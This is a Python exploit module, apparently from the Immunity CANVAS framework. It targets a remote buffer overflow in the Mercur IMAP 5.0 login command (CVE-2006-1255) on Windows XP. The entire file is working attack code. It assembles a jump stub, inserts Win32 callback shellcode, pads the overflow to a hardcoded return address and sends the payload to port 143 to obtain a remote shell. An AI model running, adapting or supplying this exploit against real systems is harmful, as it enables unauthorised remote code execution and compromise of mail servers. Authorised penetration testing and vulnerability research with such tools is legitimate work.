#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

#Insert your header comments here
#
#
#
#
#
#
import sys 
sys.path.append(".")
sys.path.append("../../")
import os
import socket
import sys
import struct

# CANVAS modules
from exploitutils import *
from tcpexploit import *
from encoder import addencoder
from shellcode import shellcodeGenerator
from shellcode import win32shell
import canvasengine
import time
from socket import *
from MOSDEF import mosdef 
from MOSDEF.mosdefutils import *

NAME= "Mercur Imap 5.0 Remote Buffer Overflow"
DESCRIPTION= "Remote Buffer Overflow on Login"
VERSION= ""
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']="Mercur"
DOCUMENTATION["Date public"]="03/16/2006"
DOCUMENTATION["Repeatability"]="One time"
DOCUMENTATION["CVE Name"] = "CVE-2006-1255"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-1255"
DOCUMENTATION['CVSS'] = 10.0

PROPERTY = {}
PROPERTY["TYPE"]= "Exploit"
PROPERTY["SITE"]=  "Remote"
PROPERTY["ARCH"]= [ ["Windows"] ]
PROPERTY["VERSION"]= ["XP"]
targets = {
    0:["Windows XP sp0 english",0x77E6FB99],
    }

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        # localhost and localport used in shellcode
        self.callbackip = "127.0.0.1"
        self.localhost = "127.0.0.1"
        self.host = "127.0.0.1"
        self.port = 80
        self.targets = targets
        self.callbackport = 5556
        self.localport = 5556
        self.covertness = 0
        self.version = 0
        self.badstring = ""
        self.connectionList = []
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.xpacket1badchars="%\x00\x0a\x0d\x20?<>"
        return

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def createShellcodexPacket1(self):
        badstring = self.xpacket1badchars
        known=[0x71a33c22,0x71a33e5d,0x71a35690]
        self.badstring="%\x00\x0a\x0d\x20?<>"
        self.createKnownWin32Shellcode(known, self.localhost, self.localport,0)
        return self.shellcode
    def createxPacket1(self):
        buf = '' 
        code = """ inc %ebx
inc %ebx
inc %ebx
inc %ebx
inc %ebx
inc %ebx
jmp %ebx """ 
        buf+=mosdef.assemble(code, 'X86')
        buf+="1 login "
        buf+=self.createShellcodexPacket1()
        buf+= "A" * 140
        self.info,self.eip = targets[self.version]
        buf+= intel_order(self.eip)
        buf+= "A" * 3
        buf+="\r\n"
        return buf

    def test(self):
        pass

    def run(self):
        self.port=143
        try:
            self.host = self.target.interface
        except:
            self.host="localhost"
        self.port = int(self.argsDict.get("port", self.port))
        FD_1 = self.gettcpsock()
        self.log("connect(%s,%s)" % (self.host, self.port))
        FD_1.connect((self.host,self.port))
        self.log("Connected!")
        recv_buf=FD_1.recv(5000)
        self.log("received: %d bytes."%len(recv_buf))
        self.log("Bytes received: %s"%prettyprint(recv_buf))
        xpacket1buf=self.createxPacket1()
        self.log("sending buffer of length %s..." % str(len(xpacket1buf)))
        FD_1.send(xpacket1buf)
        if self.ISucceeded():
            self.setInfo("%s attacking %s:%d (succeeded!)" % (self.name, self.host, self.port))
            return 1
        self.setInfo("%s attacking %s:%d (failed!)" % (self.name, self.host, self.port))
        return 0

if __name__== '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
